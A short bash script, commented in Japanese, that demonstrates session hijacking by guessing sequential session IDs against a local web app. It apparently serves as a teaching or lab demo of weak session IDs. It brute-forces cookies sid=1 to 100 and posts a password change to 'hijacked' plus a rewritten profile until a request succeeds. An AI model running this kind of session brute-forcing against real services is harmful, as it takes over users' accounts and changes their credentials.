#!/bin/bash

set -euo pipefail

echo "セッションID推測によるセッションハイジャック攻撃"

for i in {1..100}; do
  echo "sid=${i} と推測して攻撃実行"
  status_code=$(curl -i -X POST -d "password=hijacked" -d "profile=セッション脆弱性への攻撃で書き換えた" -H "Cookie: sid=${i}" http://localhost:8000/update -o /dev/null -w '%{http_code}\n' -s)
  echo "=> HTTP Status Code = ${status_code}"
  if [ "${status_code}" -eq 401 ]; then
    echo "=> 攻撃失敗"
  else
    echo "=> 攻撃成功"
    break
  fi
done
